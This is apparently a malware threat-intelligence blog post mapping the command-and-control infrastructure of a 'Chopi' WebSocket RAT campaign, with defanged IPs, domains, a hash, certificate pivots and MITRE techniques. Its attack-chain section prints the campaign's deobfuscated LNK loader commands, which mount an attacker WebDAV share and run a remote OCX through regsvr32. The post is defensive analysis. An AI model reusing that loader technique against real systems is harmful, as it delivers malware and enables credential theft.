---
layout: post
title: "Part 2: From Malware to Infrastructure - Investigating the C2 Behind a WebSocket RAT"
date: 2026-05-21
categories: [malware, threat intelligence,]
tags: [virustotal, shodan, censys, threatfox]
---
## Overview

Threat intelligence performed on the runner.ocx sample using VirusTotal, Shodan, and Censys uncovered what appears to be a dedicated threat campaign. This post maps the threat actor's infrastructure and concludes with an assessment of their likely motivations.

---

## Malware Summary

| Field | Value |
|-------|-------|
| Malware Filename Name | `runner.ocx` |
| SHA256 | `9a2d714ddd5c48722c35df8a70e97f12d46bcde05dc79b7242a7e692bd346826` |
| C2 Domain | `xtrafftrck[.]net` |
| C2 Port | `3000` |

---
## Getting Started - VirusTotal
VirusTotal is a great way to start. It reveals a gold mine of information like domain reputation, related IP addresses, https certificate details, passive DNS & community notes.

Here's what we discovered in our initial VirusTotal analysis on the C2 domain.

## DNS Resolutions

| Date Resolved | Detections | IP |
|---------------|------------|----|
| 2026-04-20 | 16/91 | `70.34.205[.]43` |
| 2025-11-27 | 2/91 | `208.85.17[.]52` |

## Subdomains

| Subdomain | Detections | IP |
|-----------|------------|----|
| `www.xtrafftrck[.]net` | 4/91 | `70.34.205[.]43` |
| `xtrafftrck[.]net` | 20/91 | `70.34.205[.]43`, `208.85.17[.]52` |

## VirusTotal - C2 IP Pivot
The front page is painted red with 16 out of 91 security vendors flagging the domain as malicious. Digging into the details tab, we find a public IP address associated with our malware's C2. 

We've also uncovered interesting tags associated with this IP. The tags were submitted by a community researcher named `JaffaCakes118`. The researcher attributes `Chopi` as a campaign tag. We'll look into this tag later in the report.

Tags: `chopi` `ClickFix` `ixwebsocket` `ocx` `WebDav` `Unknown_malware` 

Other tags associated with the C2 domain are Clickfix, ixwebsocket, ocx and WebDav. These tags reveal possible attack vector methodologies. Clickfix is a social engineering attack that tricks users into executing code on their computer. IXwebsocket notes the malware uses websocket in C2 communication. OCX relates to the malware's file type we analzed in the previous blog post. I'll touch on the WebDav tag in the attack chain analysis at the end of the report. So far, the tags have proven to be a great resource.

Pivoting on 70.34.205[.]43 uncovers 4 additional domains, potentially linking to a broader campaign. 

| Domain | Detections | First Seen | Pivot Method |
|--------|------------|------------|--------------|
| `screenly[.]cam` | 18/91 | 2026-04-01 | Shared IP + Certificate anchor |
| `paysolutions[.]ink` | 19/91 | 2026-04-28 | Shared IP |
| `ahdaratlegalservices[.]com` | 18/91 | 2026-03-18 | Shared IP |
| `aurekh[.]com` | 16/91 | 2026-03-18 | Shared IP + Shared Certificate |

## Shodan.io

Before diving into our newly discovered domains, let's lookup the IP 70.34.205[.]43 in Shodan. Shodan is a search engine for the internet of everything. If it's online, it's in Shodan. After plugging in the IP, we're presented with two domains screenly[.]cam and vulltrusercontent[.]com.
The later is a VPS hosting service. It provides the infrastructure for screenly[.]cam and xtraffck[.]net. 

A quick search on the Vultr hosting service reveals it's cheap, accepts crypto, has low identification requirements and is commonly used by threat actors. It's most likely not worth pivoting into this domain. What does seem interesting is screenly, we've now seen this domain across two different tools.

## Shodan.io Artifacts

| Property | Value |
|----------|-------|
| Host | `screenly[.]cam` |
| IP | `70.34.205[.]43` |
| Hosting | `Vultr` |
| HTTPS Cert. Thumbprint | `f6be95351f72b24e1232c138f426aa612864696f` |

| Port | Service | Banner / Notes |
|------|---------|----------------|
| `22` | SSH | `OpenSSH 9.6p1` |
| `80` | HTTP | `nginx 1.24.0 — Ubuntu` |
| `443` | HTTPS | `nginx 1.24.0 — Ubuntu` |
| `3000` | Chopi Monitoring Dashboard | `Operator C2 panel — Node.js Express` |
| `4000` | Unknown | `HTTP/1.1 400 Bad Request — Connection: close` |

## Screenly[.]cam 
Shodan provided a wealth of information. It revealed open port 3000, running a monitoring software named `Chopi Monitoring Dashboard`, which I believe is used for C2 management. The name `Chopi` ties back to the campaign tag identified by the community researcher on VirusTotal. Port 4000 is an interesting find, possibly expecting a specific key, header, or handshake before responding, as it currently returns a Bad Request error. Port 22 is standard for Vultr hosted infrastructure.

The HTTPS certificate thumbprint is an interesting artifact. Let's see what it reveals to us. We'll use another tool called Censys to investigate the certificate.

## Censys - Screenly HTTPs Certificate Thumbprint 
Earlier in VirusTotal, we identified several domains associated with the C2 IP address. Inputting the HTTPS certificate thumbprint `f6be95351f72b24e1232c138f426aa612864696f` into Censys reveals a significant finding. The threat actor reused the screenly[.]cam certificate for aurekh[.]com, confirming shared operator ownership. As noted in our VirusTotal table, aurekh[.]com was already associated with our C2 IP address.

I searched Censys for the other domains VirusTotal provided but found no certificate reuse.

## VirusTotal - Screenly
Let's go back to VirusTotal and review screenly[.]cam. This time let's look at the community notes provided by `JaffaCakes118`. He references the tags seen below. They look oddly similar to the tags we saw on our C2 domain.

Tags: `chopi` `ClickFix` `ixwebsocket` `ocx` `WebDav` `Unknown_malware`

## Google

We've seen similar tags now between our C2 domain and screenly[.]cam. Let's do a web search on Google for the `Chopi` campaign tag. Pivoting to Google, I lookup `malware chopi` and I'm presented with a link to Threatfox.

<img src="/assets/images/posts/2026-05-21-runner-threat-intel/figure1-threatfox.png" alt="lg-debug" width="800">

Check out the results! Threat researcher `Lenny_3BO` has already submitted his own findings for the `Chopi` malware campaign. Comparing his submissions against our malware sample reveals overlapping malicious domains and IPs. 


# Attack Chain

During static analysis of runner.ocx, we identified an exported function named DllInstall containing the malware payload. Combining that with our threat intelligence, we can map out what the attack chain looks like in execution.

## WebDAV - What is it?

WebDAV is a new concept I've come to learn in my analysis. WebDAV is an HTTP extension protocol. Understanding it is essential to understanding the attack vector used in this campaign.

WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to read, write, and manage files on remote web servers. Legitimate use cases include SharePoint, remote file collaboration, and content management systems. Attackers love it for the same reason: it is a file transfer protocol hiding in plain sight, often permitted through firewalls that would block other staging mechanisms.

## The Attack

Using URLScan.io, I discovered a loader file `Screenshot_2026_04_20.lnk` available on all attacker domains. The loader link file contains obfuscated instruction code. Pivoting to Triage from within URLScan.io, I downloaded the screenshot loader and deobfuscated the code. 

```Loader
net use \\70.34.205[.]43@8080\cloud\
copy \\70.34.205[.]43@8080\cloud\updater.ocx %localappdata%\Packages\9892719795172581714.ocx.ocx
start /b regsvr32 /s /i \\70.34.205[.]43@8080\cloud\updater.ocx
start \\70.34.205[.]43@8080\cloud\Credentials.txt
````

Let's break down the loader commands.

1. Windows WebClient (WebDAV) service mounts `\\70.34.205[.]43@8080\cloud` as a virtual network share over HTTP.
2. `Updater.ocx` is copied from the network drive to `%localappdata%\Packages\` and renamed.
3. `regsvr32.exe` loads `updater.ocx` directly into its own process memory from the remote share.
4. The `/b` tells windows to start application without creating a new window. 
5. The `/i:"updater.ocx"` string is passed to `DllInstall` as `pszCmdLine`.
6. The `/s` tells regsvr32 to run silently

## Analysis Gap
It is unclear how the screenshot loader makes it to the victims desktop. It's possible the user is phished or is victim to a clickfix attack. Additionally, I'm unsure of what the Credentials.txt file contains. 

## Command and Control

Now that the victim has executed the malware, the C2 is called and the operator controls the victim's computer.

- AgentThread starts and the C2 is contacted via port 3000
- Operator manages the victim machine via the `Chopi Monitoring Dashboard`

## Post-Exploitation & Motivation

In our previous post, we found the threat actors intended initial steps post-exploitation.

| Tactic | Technique | TTP ID |
|--------|-----------|--------|
| Privilege Escalation | Bypass User Account Control | `T1548.002` |
| Credential Access | OS Credential Dumping | `T1003` |
| Credential Access | Credentials from Web Browsers | `T1555.003` |
| Discovery | Network Service Discovery | `T1046` |
| Lateral Movement | Remote Services | `T1021` |

The campaign activity ranges from March to April 2026. Infrastructure domain names incorporating payment and legal services suggest deliberate targeting of financial and legal sectors. Based on the post-exploitation capabilities observed in the sample, the operator's likely objective is credential harvesting and financial gain. Further OSINT investigation reveals screenly[.]cam hosting a financial invoice request for $69,000 EUR. The overall profile is consistent with a financially motivated threat actor.

<img src="/assets/images/posts/2026-05-21-runner-threat-intel/fraud.png" alt="fraud" width="800">

## Conclusion

During our threat intelligence campaign, we used various web tools to bring together disparate artifacts. Together they map out the attackers infrastructure, attack patterns and opsec strengths and weaknesses. Small mistakes in operator security, like certificate reuse and consistent infrastructure patterns, are what ultimately expose a threat actor's full campaign.

## References

- [Threat Fox](https://threatfox.abuse.ch/browse/tag/chopi/)
- [VirusTotal](https://virustotal.com)
- [Censys](https://search.censys.com)
- [Shodan.io](https://shodan.io)
- [Triage](https://tria.ge)
- [URLscan](https://urlscan.io)

---

Analysis performed: 2026-05-21 | Analyst: John Ryan